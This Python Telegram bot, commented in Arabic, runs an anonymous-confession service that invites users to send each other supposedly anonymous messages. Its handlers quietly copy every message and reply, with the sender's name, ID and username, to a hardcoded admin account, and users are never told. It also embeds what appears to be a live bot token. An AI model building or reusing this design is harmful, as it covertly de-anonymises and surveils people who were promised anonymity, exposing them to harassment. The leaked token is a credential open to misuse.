from telegram import Update
from telegram.ext import ApplicationBuilder, ContextTypes, MessageHandler, CommandHandler, filters
from datetime import datetime

TOKEN = "8682801321:AAH6D6o_A6-4JLhbLP5aNCOWoa4Afo0gv7k"
MY_ADMIN_ID = 8820368378

blocked_users = set()
user_targets = {}
message_to_sender = {}

async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.effective_user.id
    if user_id in blocked_users:
        await update.message.reply_text("عذراً، أنت محظور من استخدام هذا البوت.")
        return
        
    bot_username = context.bot.username
    args = context.args
    
    if args:
        try:
            target_id = int(args[0])
            if target_id == user_id:
                await update.message.reply_text("لا يمكنك إرسال صراحة لنفسك! 😅\n\nهذا هو رابطك الخاص:\nhttps://t.me/" + bot_username + "?start=" + str(user_id))
                return
                
            user_targets[user_id] = target_id
            context.user_data['is_via_link'] = True
            await update.message.reply_text("أهلاً بك! اكتب رسالة الصراحة الخاصة بك، وسأقوم بإرسالها لصاحب الرابط فوراً 🥷✨")
            return
        except ValueError:
            pass

    context.user_data['is_via_link'] = False
    user_link = f"https://t.me/{bot_username}?start={user_id}"
    await update.message.reply_text(
        f"أهلاً بك في بوت صارحني الشامل 🥷✨\n\n"
        f"هذا هو رابط الصراحة الخاص بك، شاركه مع أصدقائك ليتلقوا رسائل صراحة منك:\n{user_link}"
    )

async def block_user(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if update.effective_user.id != MY_ADMIN_ID:
        return
    if context.args:
        try:
            target_id = int(context.args[0])
            blocked_users.add(target_id)
            await update.message.reply_text(f"تم حظر المستخدم بنجاح: {target_id}")
        except ValueError:
            await update.message.reply_text("الرجاء إدخال أيدي صحيح للحظر.")
    else:
        await update.message.reply_text("استخدم الأمر هكذا: /block <user_id>")

async def unblock_user(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if update.effective_user.id != MY_ADMIN_ID:
        return
    if context.args:
        try:
            target_id = int(context.args[0])
            if target_id in blocked_users:
                blocked_users.remove(target_id)
                await update.message.reply_text(f"تم إلغاء حظر المستخدم: {target_id}")
            else:
                await update.message.reply_text("المستخدم ليس في قائمة المحظورين.")
        except ValueError:
            await update.message.reply_text("الرجاء إدخال أيدي صحيح.")
    else:
        await update.message.reply_text("استخدم الأمر هكذا: /unblock <user_id>")

async def handle_message(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if not update.message or not update.message.text:
        return
        
    sender = update.message.from_user
    sender_id = sender.id
    
    if sender_id in blocked_users:
        await update.message.reply_text("عذراً، أنت محظور ولا يمكنك إرسال رسائل.")
        return

    message_text = update.message.text
    sender_username = f"@{sender.username}" if sender.username else "لا يوجد"
    sender_name = sender.first_name if sender.first_name else "مجهول"
    current_time = datetime.now().strftime("%Y/%m/%d - %I:%M:%S %p")

    # دالة موحدة لإرسال معلومات المرسل إلك أنتِ وحدك دايماً
    async def send_admin_info():
        await context.bot.send_message(
            chat_id=MY_ADMIN_ID,
            text=f"👤 معلومات المرسل:\n- الاسم: {sender_name}\n- الأيدي: {sender_id}\n- اليوزر: {sender_username}"
        )

    # 1. نظام الرد المباشر (Reply)
    if update.message.reply_to_message:
        replied_msg_id = update.message.reply_to_message.message_id
        if replied_msg_id in message_to_sender:
            original_sender_id = message_to_sender[replied_msg_id]
            
            reply_text = (
                f"صارحني 📨:\n"
                f"💌 وصلتك رسالة جديدة\n"
                f"⏱ وقت الرسالة: {current_time}\n"
                f"----\n"
                f"{message_text}\n"
                f"----\n\n"
                f"- تبرع لإستمرار عمل بوت صارحني 🎁"
            )
            
            sent_msg = await context.bot.send_message(chat_id=original_sender_id, text=reply_text)
            message_to_sender[sent_msg.message_id] = sender_id
            
            await update.message.reply_text("✅ تم الرد على هذه الرسالة بنجاح")
            
            # إرسال التقرير والمعلومات للمديرة فوراً
            await context.bot.send_message(chat_id=MY_ADMIN_ID, text=f"📋 [مراقبة رد] تم إرسال رد إلى ({original_sender_id}):\n\n{message_text}")
            await send_admin_info()
            return

    is_via_link = context.user_data.get('is_via_link', False)
    target_id = user_targets.get(sender_id)

    if is_via_link and target_id:
        formatted_msg = (
            f"صارحني 📨:\n"
            f"💌 وصلت رسالة جديدة\n"
            f"⏱ وقت الرسالة: {current_time}\n"
            f"----\n"
            f"{message_text}\n"
            f"----\n\n"
            f"- تبرع لإستمرار عمل بوت صارحني 🎁"
        )
        
        sent_msg = await context.bot.send_message(chat_id=target_id, text=formatted_msg)
        message_to_sender[sent_msg.message_id] = sender_id
        
        await update.message.reply_text("تم إرسال صراحتك بنجاح 🥷✨")
        
        # إرسال نسخة المراقبة والمعلومات الكاملة إلك كمديرة بغض النظر لمن أُرسلت الرسالة
        await context.bot.send_message(chat_id=MY_ADMIN_ID, text=f"📋 [مراقبة صارحني] رسالة أُرسلت إلى المستخدم ({target_id}):\n\n{message_text}")
        await send_admin_info()
        
        if sender_id in user_targets:
            del user_targets[sender_id]
        context.user_data['is_via_link'] = False
        
    else:
        formatted_direct = (
            f"صارحني 📨:\n"
            f"💌 وصلت رسالة مباشرة للبوت\n"
            f"⏱ وقت الرسالة: {current_time}\n"
            f"----\n"
            f"{message_text}\n"
            f"----\n\n"
            f"- تبرع لإستمرار عمل بوت صارحني 🎁"
        )
        
        sent_msg = await context.bot.send_message(chat_id=MY_ADMIN_ID, text=formatted_direct)
        message_to_sender[sent_msg.message_id] = sender_id
        
        await send_admin_info()
        await update.message.reply_text("تم إرسال رسالتك للبوت بنجاح ✨")

if __name__ == '__main__':
    application = ApplicationBuilder().token(TOKEN).build()
    application.add_handler(CommandHandler("start", start))
    application.add_handler(CommandHandler("block", block_user))
    application.add_handler(CommandHandler("unblock", unblock_user))
    application.add_handler(MessageHandler(filters.TEXT & ~filters.COMMAND, handle_message))
    application.run_polling(allowed_updates=Update.ALL_TYPES)
